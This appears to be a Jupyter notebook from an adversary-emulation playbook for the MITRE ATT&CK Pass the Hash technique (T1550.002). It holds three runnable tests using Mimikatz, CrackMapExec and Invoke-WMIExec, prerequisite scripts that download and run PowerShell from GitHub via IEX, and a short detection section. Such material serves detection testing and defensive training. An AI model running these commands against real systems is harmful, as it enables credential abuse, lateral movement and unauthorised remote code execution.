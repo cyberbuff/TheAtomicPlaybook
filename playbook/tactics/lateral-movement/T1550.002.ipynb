{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "36ce54fc",
   "metadata": {},
   "source": "# T1550.002 - Pass the Hash\nAdversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)"
  },
  {
   "cell_type": "markdown",
   "id": "8c156c88",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "7be4e3eb",
   "metadata": {},
   "source": "### Atomic Test #1 - Mimikatz Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n\n##### Check Prereq Commands:\n```cmd\n$mimikatz_path = cmd /c echo %tmp%\\mimikatz\\x64\\mimikatz.exe\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo %tmp%\\mimikatz\\x64\\mimikatz.exe\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "648e78bc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1550.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "70fb7f8b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n%tmp%\\mimikatz\\x64\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "45dba359",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1550.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "c765282a",
   "metadata": {},
   "source": "### Atomic Test #2 - crackmapexec Pass the Hash\ncommand execute with crackmapexec\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n\n##### Check Prereq Commands:\n```cmd\nif(Test-Path C:\\CrackMapExecWin\\crackmapexec.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nWrite-Host Automated installer not implemented yet, please install crackmapexec manually at this location: C:\\CrackMapExecWin\\crackmapexec.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e3ca0b7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1550.002 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "73a194a3",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\CrackMapExecWin\\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14934280",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1550.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "95716629",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Invoke-WMIExec Pass the Hash",
    "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc394af6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1550.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "1b2f43fd",
   "metadata": {},
   "source": "## Detection\nAudit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}